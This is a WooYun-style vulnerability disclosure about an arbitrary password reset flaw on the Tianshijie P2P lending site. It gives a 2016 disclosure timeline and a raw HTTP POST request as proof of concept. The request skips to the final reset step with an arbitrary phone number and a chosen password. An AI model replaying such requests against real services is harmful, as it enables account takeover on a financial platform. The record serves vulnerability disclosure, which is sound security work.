wybug_title: p2p金融安全之天使街主站任意用户密码重置漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-03-29：	细节已通知厂商并且等待厂商处理中									2016-03-29：	厂商已经确认，细节仅向厂商公开									2016-04-08：	细节向核心白帽子及相关领域专家公开									2016-04-18：	细节向普通白帽子公开									2016-04-28：	细节向实习白帽子公开									2016-05-13：	细节向公众公开  简要描述： p2p金融安全之天使街主站任意用户密码重置漏洞 详细说明：  
POST /user/getbackpassword HTTP/1.1Host: www.tianshijie.com.cnProxy-Connection: keep-aliveContent-Length: 67Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.tianshijie.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://www.tianshijie.com.cn/user/getbackpasswordAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: PHPSESSID=bgpnibnvbh4ku0dtjmivvuf3o1; QIAO_CK_6586897_R=http%3A//wlmq.tianshijie.com.cn/special/fenzhan; baidu_qiao_v3_count_6586897=1; angelstreet_pllseccode8028552c=9ESZ28CCy90757063V0MjwE1D2OwBTvKCRiQSvGAGBy-xFmOn6v; CNZZDATA1257893443=1873852129-1459153604-http%253A%252F%252Fwlmq.tianshijie.com.cn%252F%7C1459153604; Hm_lvt_d00c4ac5bb7249ddff51d62c9e4e57b9=1459158118; Hm_lpvt_d00c4ac5bb7249ddff51d62c9e4e57b9=1459158363AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3password=wooyuntest&pwdconfirm=wooyuntest&step=2&mobile=13888888888
